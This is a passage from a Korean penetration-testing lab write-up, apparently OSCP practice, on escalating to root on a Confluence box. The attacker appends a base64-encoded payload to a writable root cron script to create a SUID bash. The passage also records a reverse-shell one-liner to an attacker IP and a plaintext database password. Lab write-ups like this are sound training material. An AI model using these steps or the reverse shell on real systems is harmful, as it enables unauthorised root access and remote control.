`systemctl list-timers --all` 과 `grep -rl "log-backup" /etc/systemd /usr/lib/systemd /etc/cron*` 은 둘 다 이 스크립트를 참조하는 유닛을 못 찾았음 — 타이머 15개가 전부 배포판 기본이고 grep 은 빈 결과였음. 즉 **트리거가 볼 수 없는 곳에 있다**는 것까지가 저권한에서 확정 가능한 전부였음.

> [!danger] 크론 열거가 「아무것도 없음」이었는데 크론이 있었다
> 반사 열거에서 `/etc/crontab`·`/etc/cron.d`·`/etc/cron.hourly` 는 전부 배포판 기본값이었고 `crontab -l` 은 `no crontab for confluence` 였음.
> **그런데 root 개인 crontab 에 있었음.** root 권한을 얻은 뒤 확인한 것:
>
> ```bash
> root@flu:/opt/atlassian/confluence/bin# crontab -l
> ...
> # m h  dom mon dow   command
>
> */1 * * * * /opt/log-backup.sh
>
> root@flu:/opt/atlassian/confluence/bin# ls -la /var/spool/cron/crontabs/
> total 12
> drwx-wx--T 2 root crontab 4096 Dec 12  2023 .
> drwxr-xr-x 3 root root    4096 Apr 15  2023 ..
> -rw------- 1 root crontab 1122 Dec 12  2023 root
> ```
> — 출처: `~/PG/Flu/privesc_session.log`
>
> `/var/spool/cron/crontabs` 는 `drwx-wx--T` — **읽기 권한이 없음.** 목록조차 볼 수 없고 `root` 파일은 `0600` 임.
> **저권한 사용자에게 크론은 근본적으로 부분 관측임.** `/etc/cron*` 이 비었다고 「크론 없음」으로 결론 내면 안 됨.
> 사용자 개인 crontab 의 존재는 **간접 증거로만** 잡힘 — 여기서는 ⓐ 남의 홈에 쓰는 스크립트가 있고 ⓑ 그게 내 소유라는 것. `pspy` 로 프로세스 생성을 엿보는 것도 같은 목적의 수단임.

#### 익스플로잇 — 한 줄 추가하고 1분 기다린다

원본을 먼저 백업함(정리용). 페이로드는 SUID bash 를 만드는 한 줄임.

`base64 -d` 로 밀어 넣은 이유는 TTY 없는 셸에서 **따옴표와 리다이렉션이 tmux `send-keys` 를 거치며 깨지는 것을 피하기 위해서**임. 디코드되는 내용은 `cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash` 임.

```bash
confluence@flu:/opt/atlassian/confluence/bin$ cp /opt/log-backup.sh /tmp/.lb.orig; echo Y3AgL2Jpbi9iYXNoIC90bXAvcm9vdGJhc2g7IGNobW9kIDQ3NTUgL3RtcC9yb290YmFzaA== | base64 -d >> /opt/log-backup.sh; tail -3 /opt/log-backup.sh; date


cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbashThu Aug 20 04:52:17 AM UTC 2026
```
— 출처: `~/PG/Flu/privesc_session.log`

`tail -3` 의 앞 두 줄이 빈 줄인 것은 원본 스크립트가 빈 줄로 끝나기 때문임. 붙인 페이로드에 개행이 없어 뒤이은 `date` 출력이 **같은 줄에 이어 붙었음**(`...rootbashThu Aug 20...`).

그리고 기다림:

```bash
confluence@flu:/opt/atlassian/confluence/bin$ for i in $(seq 1 100); do [ -f /tmp/rootbash ] && break; sleep 5; done; date; ls -la /tmp/rootbash 2>&1; ls -la /root/backup 2>&1 | head -5
Thu Aug 20 04:53:05 AM UTC 2026
-rwsr-xr-x 1 root root 1437832 Aug 20 04:53 /tmp/rootbash
ls: cannot access '/root/backup': Permission denied
```
— 출처: `~/PG/Flu/privesc_session.log`

**48초 만에 떨어졌음.** `-rwsr-xr-x root root` — SUID 비트가 붙은 root 소유 bash.

**무작정 `sleep 60` 하지 말고 폴링 루프를 쓸 것.** `for i in $(seq 1 100); do [ -f 타겟 ] && break; sleep 5; done` 는
- 주기를 모를 때도 통함 (여기서는 1분이었지만 5분일 수도 있었음)
- 도착하는 즉시 빠져나옴 — 고정 `sleep` 처럼 남은 시간을 버리지 않음
- 상한이 있어 크론이 안 돌 때 셸이 영원히 먹통이 되지 않음 (여기선 최대 500초)

그리고 **`date` 를 앞뒤로 찍을 것.** 위 두 블록의 `04:52:17` → `04:53:05` 가 「크론이 실제로 돌았다」는 유일한 직접 증거임.

> [!warning] SUID bash 를 고른 이유 — 그리고 `-p` 를 빠뜨리면 안 되는 이유
> 크론 페이로드의 선택지는 여럿임 — `/etc/sudoers` 에 줄 추가, `/root/.ssh/authorized_keys` 에 키 추가, root 리버스셸 발사, SUID 셸 복사.
> **SUID bash 를 고른 이유는 되돌리기가 가장 싸기 때문임** — 파일 하나 지우면 끝이고 root 의 설정 파일이나 `.ssh` 를 건드리지 않음. 리스너를 하나 더 띄울 필요도 없음.
>
> 대신 함정이 있음. **bash 는 SUID 로 실행되면 기본적으로 특권을 버림** — `euid != uid` 를 감지하면 실효 UID 를 실제 UID 로 되돌림. `-p`(privileged)를 줘야 그 강등을 건너뜀.
> `/tmp/rootbash` 를 그냥 실행하면 **평범한 `confluence` 셸이 나옴.** 반드시 `/tmp/rootbash -p` 임.

#### root 확인

```bash
confluence@flu:/opt/atlassian/confluence/bin$ python3 -c "import pty;pty.spawn([\"/tmp/rootbash\",\"-p\"])"
rootbash-5.2# export TERM=xterm; id; whoami; hostname; hostname -I; echo ---; ls -la /root; echo ---; cat /root/proof.txt
uid=1001(confluence) gid=1001(confluence) euid=0(root) groups=1001(confluence)
root
flu
192.168.248.41
---
total 64
drwx------  7 root root  4096 Aug 20 04:45 .
drwxr-xr-x 19 root root  4096 Dec 12  2023 ..
drwxr-xr-x  8 root root 12288 Aug 20 04:53 backup
lrwxrwxrwx  1 root root     9 Dec 12  2023 .bash_history -> /dev/null
-rw-r--r--  1 root root  3106 Oct 17  2022 .bashrc
drwx------  2 root root  4096 Dec 12  2023 .cache
-rw-r--r--  1 root root    20 Dec 12  2023 email8.txt
drwxr-xr-x  4 root root  4096 Dec 12  2023 .java
-rw-------  1 root root    20 Dec 12  2023 .lesshst
-rw-r--r--  1 root root   161 Oct 17  2022 .profile
-rw-r--r--  1 root root    33 Aug 20 04:46 proof.txt
-rw-r--r--  1 root root    75 Dec 12  2023 .selected_editor
drwx------  3 root root  4096 Dec 12  2023 snap
drwx------  2 root root  4096 Dec 12  2023 .ssh
-rw-r--r--  1 root root     0 Dec 12  2023 .sudo_as_admin_successful
-rw-------  1 root root  2863 Dec 12  2023 .viminfo
---
2caa37b3c096709c688b69556c3c6cf7
```
— 출처: `~/PG/Flu/privesc_session.log`

`euid=0` 이니 이미 무엇이든 읽을 수 있음. **`whoami` 가 `root` 인 것도 `euid` 를 보기 때문임.** 이 한 화면이 `/root` 가 `drwx------` 인데 `proof.txt` 는 `-rw-r--r--` 였다는 것도 같이 보여줌 — 아래 `Post-Exploitation` 의 콜아웃 근거임.

프롬프트가 `rootbash-5.2#` 인 것은 uid 와 무관함 — bash 의 기본 `PS1` 이 `\s-\v\$`(셸 이름 + 버전)이고, 복사본 이름이 `rootbash`·버전이 5.2 여서 그렇게 뜬 것임. 마지막 `#` 만 `euid=0` 을 뜻함.

```bash
ssh kali@10.44.44.128 "cp /bin/bash /tmp/rootbash_t; /tmp/rootbash_t --norc -i -c 'echo PS1_DEFAULT=\$PS1'"
rootbash_t: cannot set terminal process group (-1): Inappropriate ioctl for device
rootbash_t: no job control in this shell
PS1_DEFAULT=\s-\v\$
```
(타겟이 아니라 Kali 에서 돌린 재현임)

`uid` 는 여전히 1001 임. 증거 스크린샷에 `uid=0(root)` 를 담고 싶으면 한 단계 더 감:

```bash
rootbash-5.2# python3 -c "import os;os.setresuid(0,0,0);os.setresgid(0,0,0);os.execl(\"/bin/bash\",\"bash\",\"-i\")"
root@flu:/opt/atlassian/confluence/bin# id; whoami; hostname; hostname -I; date; echo ---; cat /root/proof.txt; cat /home/confluence/local.txt; echo ---; ls -l /root/proof.txt /home/confluence/local.txt
uid=0(root) gid=0(root) groups=0(root),1001(confluence)
...
```
— 출처: `~/PG/Flu/privesc_session.log`. 이 명령의 출력 전문이 아래 `Post-Exploitation` 의 한 화면 증거임

**`euid=0` 과 `uid=0` 의 실무적 차이** — 플래그를 읽는 데는 `euid=0` 이면 충분함. 차이가 생기는 곳은 따로 있음:
- 일부 도구가 `getuid()` 로 권한을 판정해 거부함
- `su`·`ssh`·`sudo` 같은 SUID 프로그램이 실제 UID 를 봄
- **증거 스크린샷** — `uid=0(root)` 한 줄이 심사관에게 훨씬 명확함

`setresuid(0,0,0)` 은 실제·실효·저장 UID 를 전부 0 으로 못 박음. `euid` 가 이미 0 이라 허용됨.

### Post-Exploitation

**Proof.txt value:**
`2caa37b3c096709c688b69556c3c6cf7`

두 플래그 모두 **대화형 셸에서 원위치 `cat`** 으로 읽었음. 웹셸을 경유하지 않았음.

```bash
root@flu:/opt/atlassian/confluence/bin# id; whoami; hostname; hostname -I; date; echo ---; cat /root/proof.txt; cat /home/confluence/local.txt; echo ---; ls -l /root/proof.txt /home/confluence/local.txt
uid=0(root) gid=0(root) groups=0(root),1001(confluence)
root
flu
192.168.248.41
Thu Aug 20 04:54:36 AM UTC 2026
---
2caa37b3c096709c688b69556c3c6cf7
52791694c2a6ccde2db0f566f81d084f
---
-rw-r--r-- 1 confluence confluence 33 Aug 20 04:45 /home/confluence/local.txt
-rw-r--r-- 1 root       root       33 Aug 20 04:46 /root/proof.txt
```
— 출처: `~/PG/Flu/flag_evidence.txt`

| 플래그 | 위치 | 값 | 방법 |
|---|---|---|---|
| `local.txt` | `/home/confluence/local.txt` | `2d0c7239ce98c1add6986385f076c26e` (1차 세션 · 제출 완료) | CVE-2022-26134 리버스셸 |
| `local.txt` | 〃 | `52791694c2a6ccde2db0f566f81d084f` (2차 세션 · 리버트로 재생성) | 〃 |
| `proof.txt` | `/root/proof.txt` | `2caa37b3c096709c688b69556c3c6cf7` | root cron 이 도는 쓰기 가능 스크립트 → SUID bash |

> [!warning] `--read-file /root/proof.txt` 가 실패한 진짜 이유 — 직관적인 설명은 틀렸다
> 직관적으로는 *"`/root/proof.txt` 는 통상 `0600 root:root` 다"* 로 보이나 **실측은 `-rw-r--r--`(0644)임.** 파일 자체는 누구나 읽을 수 있는 모드임.
> 막은 것은 **디렉터리**임 — `/root` 가 `drwx------ root root` 라서 `confluence` 는 그 안으로 경로 탐색 자체가 안 됨(`Privilege Escalation` 반사 열거의 `ls: cannot open directory '/root': Permission denied`).
> 결론(권한 경계를 못 넘는다)은 같지만 이유가 다르고 그 차이가 실무적으로 중요함 — 파일 모드만 보고 「읽을 수 있겠네」라고 판단하면 안 됨. **경로 위의 모든 디렉터리에 `x` 권한이 있어야 파일에 닿음.**

**남긴 흔적**

되돌린 것:
- `/opt/log-backup.sh` — 페이로드 한 줄을 붙였다가 `/tmp/.lb.orig` 백업으로 **복원.** 복원 확인 근거는 md5 `8364444e3d54916cc38b8bea50ebc5e2`
- `/tmp/rootbash`(SUID bash) — **삭제 확인**
- `/tmp/.lb.orig`(백업본) — **삭제 확인**

⚠️ **정리 구간은 세션 로그에 없음.** `privesc_session.log` 는 04:54:36 의 root crontab 확인(`===DONE9`)에서 끝나고, 정리는 그 뒤인 04:56 에 이뤄졌음. 위 세 줄의 유일한 기록은 `~/PG/Flu/writeup_notes.txt` 의 04:56 항목임.

Kali 쪽 `tmux` 세션 `flunmap`·`flushell` 의 종료 여부는 **관측 없음** — 어느 산출물에도 남지 않았음.

남아 있던 것(노트 작성 시점 기준):
- **리버스셸 프로세스** — `confluence` 로 `bash -c bash -i >& /dev/tcp/192.168.45.207/1270 0>&1` 와 그 자식들. 플래그 재확인을 위해 의도적으로 살려 뒀음. **박스가 정지된 지금은 인스턴스와 함께 소멸함**
- **Kali `tmux` 세션 `flushell`** — 위 셸을 담고 있었음. 같은 이유로 남겼음
- `/root/backup/log_backup_*` — **박스 자신의 크론이 1분마다 만드는 것**이지 심은 것이 아님. 스크립트의 `-mmin +5` 가 알아서 지움

**획득 자격증명** — Confluence DB: `confluence` / `HoldingOn12`(MySQL, localhost 전용). Confluence 웹 admin 해시 `{PKCS5S2}MCB0MaBA39Gj...` — 크랙하지 않았음.

**타겟에 업로드한 파일 없음.** linpeas 를 포함해 어떤 도구도 올리지 않았음. 쓴 것은 `/tmp/rootbash`·`/tmp/.lb.orig` 둘뿐이고 둘 다 지웠음.

## 관련

- CVE-2022-26134 — Atlassian Confluence OGNL injection (미인증 RCE)
- 벤더 어드바이저리: <https://confluence.atlassian.com/doc/confluence-security-advisory-2022-06-02-1130377146.html>
- 사용한 PoC: <https://github.com/jbaines-r7/through_the_wire> (Jacob Baines / Rapid7). 클론본 `~/PG/Flu/through_the_wire/`
- 막다른 길이었던 익스플로잇: EDB 51904 = CVE-2023-22527 (Confluence 8.0.x–8.5.3, `/template/aui/text-inline.vm`) — **7.13.6 에는 해당 없음**
- OGNL 명세(Apache Commons OGNL) — 표현식 언어의 메서드 호출 능력
- `nmap-services`(포트↔이름 표): `/usr/share/nmap/nmap-services`
- OSCP Exam Guide, "Exam Proofs"(웹셸 금지 조항): <https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide>
- [[_PLAYBOOK#A-13. 익스플로잇을 던지기 전에 버전과 CVE 표기를 검증한다]] — `Confluence < 8.5.3` 제목 오독과 PoC 헤더의 CVE 오타가 이 항목에 실려 있음
- [[_PLAYBOOK#A-41. 셸은 잡았는데 권한상승 실마리가 없다]] · [[_PLAYBOOK#A-45. 크론이 안 보인다 / `find` 가 정답을 잘랐다]] · [[_PLAYBOOK#B-31. 크론 기반 권한상승]]
- [[_PLAYBOOK#A-11. 자동 도구가 뱉은 값이 의심스럽다]] — nmap SERVICE 열의 `?` 와 OS 지문 오탐
- [[_PLAYBOOK#B-1-50. Atlassian Confluence CVE-2022-26134 — URI 경로 OGNL 주입 (미인증 RCE)]] — 이 박스 진입 경로 카드(OGNL·Nashorn·PoC 함정)
- [[Astronaut]] · [[Exfiltrated]] · [[Muddy]] · [[Zipper]] — 같은 권한상승 유형(**크론이 도는 스크립트·경로를 저권한이 건드린다**). Flu 는 그중 가장 단순한 형태 — 스크립트 파일 자체를 쓸 수 있었음
- [[Clue]] — 공개 PoC 를 손으로 고쳐 쓰는 법, 리버스셸 `lhost` 오지정, exploit 헤더의 거짓 주석
- [[plum]] — 누적 패턴 **「익스플로잇 전에 버전 범위를 대조하라」**. 51904 오판과 같은 실패
- [[Squid]] · [[Exfiltrated]] · [[Hawat]] — 누적 패턴 「인용이 깨지면 인코딩으로 도망간다」. `bash -c` 래핑이 같은 계열
- [[Crane]] · [[RubyDome]] · [[Astronaut]] · [[Exghost]] — 누적 패턴 「응답이 성공을 뜻하지 않는다」. 파일 읽기의 무응답은 그 거울상
- [[Hub]] · [[Levram]] — 누적 패턴 「버전 판정은 독립 근거 2개」
- [[Butch]] — ⚠️ 웹셸로 얻은 플래그는 OSCP 에서 0점. 증거 스크린샷 형식
- [[Jacko]] — Flu 가 오래 머물렀던 **부분 완료(1/2)** 상태에 여전히 있는 박스
